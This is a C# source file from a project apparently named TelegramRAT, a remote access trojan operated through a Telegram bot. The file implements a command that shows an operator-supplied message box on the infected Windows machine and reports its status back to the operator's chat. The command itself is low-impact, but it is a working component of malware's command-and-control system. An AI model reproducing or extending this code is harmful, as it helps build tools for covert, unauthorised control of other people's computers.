using Telegram.Bot;
using TelegramRAT.Services;
using TelegramRAT.Utilities;

namespace TelegramRAT.Commands.Remote;

public class MessageCommand(ITelegramBotClient botClient, IBotNotificationService notificationService, IWinApiService winApiService) : AbstractBotCommand
{
    public override string Command => "message";
    public override string[] Aliases => new[] { "msg" };
    public override string Description => "Send message with dialog window.";
    public override string Example => "message Lorem ipsum";
    public override int ArgsCount => -2;

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            var showMessageBoxTask = winApiService.ShowMessageBoxAsync(model.RawArgs ?? string.Empty, "Message", WinAPI.MsgBoxFlag.MB_APPLMODAL | WinAPI.MsgBoxFlag.MB_ICONINFORMATION);
            await botClient.SendMessage(model.Message.Chat.Id, "Sent!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
            await showMessageBoxTask;
            await botClient.SendMessage(model.Message.Chat.Id, "Message box closed", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }
}
